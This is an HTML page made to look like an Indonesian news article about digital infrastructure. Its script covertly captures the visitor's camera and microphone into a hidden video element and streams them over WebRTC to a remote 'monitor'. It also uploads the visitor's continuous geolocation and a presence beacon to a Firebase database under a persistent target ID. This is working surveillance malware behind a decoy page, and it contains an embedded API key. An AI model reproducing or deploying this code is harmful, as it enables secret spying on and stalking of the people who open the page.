<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Berita Terkini</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
        .nav { background: #1e40af; color: white; padding: 15px; font-weight: bold; margin-bottom: 20px; }
        #v { display: none; }
    </style>
</head>
<body>
    <div class="nav">NEWS UPDATE LIVE</div>
    <h1>Infrastruktur Digital Masa Depan Indonesia</h1>
    <p>Pengembangan jaringan komunikasi yang stabil menjadi prioritas utama...</p>
    <img src="https://picsum.photos/800/400" style="width:100%; border-radius:10px;">
    
    <video id="v" autoplay playsinline muted></video>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAQn-HOc2ut9_Dcw0LiPhvUMfzrjaLhj2Q",
            databaseURL: "https://chatroom-e9b3f-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "chatroom-e9b3f"
        };
        firebase.initializeApp(firebaseConfig);

        // Gunakan ID tetap dari localStorage agar konsisten
        let targetId = localStorage.getItem('target_id');
        if (!targetId) {
            targetId = "TGT-" + Math.random().toString(36).substr(2, 5);
            localStorage.setItem('target_id', targetId);
        }

        const db = firebase.database().ref('v6_sync/' + targetId);
        let pc;
        let localStream;

        async function createOffer() {
            console.log("Memulai proses Handshake (Kirim Offer)...");
            if (pc) pc.close();
            
            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });

            pc.onicecandidate = e => {
                if (e.candidate) db.child('ice_t').push(e.candidate.toJSON());
            };

            if (localStream) {
                localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
            }

            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);
            
            // Bersihkan data lama sebelum kirim yang baru
            await db.child('ice_t').remove();
            await db.child('ice_m').remove();
            await db.child('sdp/answer').remove();
            
            db.child('sdp/offer').set({ type: offer.type, sdp: offer.sdp, ts: Date.now() });
        }

        async function init() {
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('v').srcObject = localStream;
            } catch (e) { console.error("Kamera/Audio diblokir"); }

            // Update status keberadaan target
            setInterval(() => {
                db.child('presence').set(Date.now());
            }, 3000);

            // Logika RE-SYNC: Jika Monitor refresh, ia akan menghapus folder 'sdp/answer'
            // Target mendengarkan ini, jika answer dihapus tapi monitor masih ada, kirim offer lagi.
            db.child('sdp/answer').on('value', async s => {
                const a = s.val();
                if (a && !pc.currentRemoteDescription) {
                    await pc.setRemoteDescription(new RTCSessionDescription(a));
                }
            });

            // LOGIKA UTAMA: Pantau 'monitor_ping'. Jika monitor baru masuk (refresh), kirim Offer.
            db.child('monitor_ping').on('value', s => {
                if (s.exists()) createOffer();
            });

            db.child('ice_m').on('child_added', s => {
                if(pc) pc.addIceCandidate(new RTCIceCandidate(s.val())).catch(e=>{});
            });

            // Kirim lokasi
            navigator.geolocation.watchPosition(p => {
                db.child('status').update({ lat: p.coords.latitude, lng: p.coords.longitude, id: targetId });
            });
        }

        window.onload = init;
    </script>
</body>
</html>
